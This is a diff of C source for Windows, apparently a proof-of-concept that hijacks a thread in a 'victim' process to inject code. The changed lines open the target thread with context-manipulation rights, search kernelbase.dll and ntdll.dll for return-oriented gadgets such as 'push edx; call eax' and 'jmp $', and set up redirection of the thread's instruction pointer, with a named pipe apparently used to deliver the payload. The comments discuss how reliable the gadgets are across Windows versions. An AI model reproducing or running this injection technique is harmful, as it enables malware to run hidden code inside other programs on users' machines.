@@ -4,14 +4,26 @@
 #define HEAP_ALLOC 0x1000 //how much mem to alloc on heap in victim
 #define gpa(x, y) ((unsigned int)GetProcAddress(GetModuleHandleA(x), y))
 int main(int argc, char** argv){
-    unsigned char pipename[] = "\\\\.\\pipe\\spookypipe"; //note: this name including null byte at end shld be a multiple of 4 bytes. makes the write to stack a little simpler later on
-    DWORD tid = atoi(argv[1]); //get thread id using args
-    HANDLE thd = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);
+    //note: this name including null byte at end shld be a multiple of 4 bytes. makes the write to stack a little simpler later on
+    unsigned char pipename[] = "\\\\.\\pipe\\spookypipe";
     
-    //find gadgets, using kernelbase.dll
-    pshc=findr("\x50\xFF\xD6", 3); //push eax; call esi
-    jmps=findr("\xEB\xFE", 2); //jmp $
-    ret=findr("\xC3", 1); //ret
+    DWORD tid = atoi(argv[1]); //get thread id using args
+    HANDLE thd = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_QUERY_INFORMATION, FALSE, tid);
+    if(thd==NULL){
+        printf("Error! Could not acquire handle!\n");
+        return -1;
+    }
+    printf("Finding gadgets...\n");
+    //find gadgets, using kernelbase.dll and ntdll.dll
+
+    //by some MASSIVE stroke of luck, somehow, `push edx; call eax` is present in ntdll of BOTH win7 and win10 tested
+    //they don't even show up in a remotely similar context! win7's gadget shows up in RtlpNotOwnerCriticalSection, while win10 is in some non-exported fn
+    //it should be obvious that this is not the most reliable of gadgets. however, there are a total of 3 (including this) push-call gadgets in ntdll of 22H2
+    //i do not have a copy of windows 11, if possible, please do help see if this gadget exist there.
+    pshc=findr("\x52\xFF\xD0", 3, "ntdll.dll"); //push edx; call eax
+    
+    jmps=findr("\xEB\xFE", 2, "kernelbase.dll"); //jmp $
+    ret=findr("\xC3", 1, "kernelbase.dll"); //ret
     
     //set eip to a `jmp $`, blocks when kernel exit
     CONTEXT ctx;
